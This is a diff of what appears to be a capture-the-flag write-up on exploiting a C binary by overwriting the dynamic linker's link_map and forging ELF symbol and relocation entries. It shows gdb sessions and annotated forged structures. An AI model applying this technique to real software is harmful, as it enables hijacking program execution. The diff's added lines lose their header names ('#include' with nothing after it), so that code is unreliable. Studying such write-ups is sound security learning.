@@ -5,9 +5,9 @@
 
 
 ```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
 
 int getint(void);
 void modify(void);
@@ -52,17 +52,12 @@ end:
 	puts("Bye.");
 	return 0;
 }
-```
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <stdint.h>
+    #include 
 
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <unistd.h>
-
-#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
+    #define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
 
 char gbuf[0x100];
 
@@ -106,11 +101,6 @@ void exit_imm(int status){
  );
 	__builtin_unreachable();
 }
-```
-
-
-
-```
 fini:
  endbr64
  push rbp
@@ -127,11 +117,6 @@ menu:
  call _getint
  pop rbp
  retn
-```
-
-
-
-```
 gef➤ vmmap
 [ Legend: Code | Heap | Stack ]
 Start End Offset Perm Path
@@ -162,17 +147,7 @@ Start End Offset Perm Path
 0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
 0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
-```
-
-
-
-```
 gef➤ set *(char [0x2001]*)0x00007ffff7fba0c0 = "AAAAA...A"
-```
-
-
-
-```
 gef➤ p *l
 $2 = {
  l_addr = 0x4141414141414141,
@@ -183,21 +158,11 @@ $2 = {
  l_serial = 0x4141414141414141
 }
 gef➤
-```
-
-
-
-```
 Elf64_Rela {
  r_offset = 0x4038,
  r_info = ELF64_R_INFO(6, ELF_MACHINE_JMP_SLOT),
  r_addend = 0
 }
-```
-
-
-
-```
 Elf64_Sym {
  st_name = 0x66,
  st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
@@ -206,11 +171,6 @@ Elf64_Sym {
  st_value = 0,
  st_size = 0,
 }
-```
-
-
-
-```
 Elf64_Sym {
  st_name = 0x4f60,
  st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
@@ -219,11 +179,6 @@ Elf64_Sym {
  st_value = 0x43640,
  st_size = 0x19,
 }
-```
-
-
-
-```
 typedef struct
 {
  Elf64_Sxword	d_tag; /* Dynamic entry type */
@@ -233,11 +188,6 @@ typedef struct
  Elf64_Addr d_ptr; /* Address value */
  } d_un;
 } Elf64_Dyn;
-```
-
-
-
-```
 // before overwrite
 0x7ffff7fb9e98: Elf64_Dyn { d_tag = 5, d_un = 0x7ffff7fb6460 }
 0x7ffff7fb9ea8: Elf64_Dyn { d_tag = 6, d_un = 0x7ffff7fb6328 }
@@ -264,11 +214,6 @@ typedef struct
  l_info[27] = 0x7ffff7fba098,
  // ...
 }
-```
-
-
-
-```
 Elf64_Sym {
  st_name = 0, // useful, since this means we need to call modify less often
  st_info = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC),
@@ -277,21 +222,11 @@ Elf64_Sym {
  st_value = 0x1054, // whatever we want to call, this specific one will be explained later
  st_size = 0,
 }
-```
-
-
-
-```
 Elf64_Rela {
  r_offset = 0x4038, // explained later why this is necessary
  r_info = ELF64_R_INFO(11, ELF_MACHINE_JMP_SLOT), // the symbol index here was necessary, since I ran out of bytes to write and this happens to point to something that can be interpreted as a valid symbol :)
  r_addend = 0,
 }
-```
-
-
-
-```
 Elf64_Sym {
  st_name = 0x1080,
  // ... some other values, we don't actually care
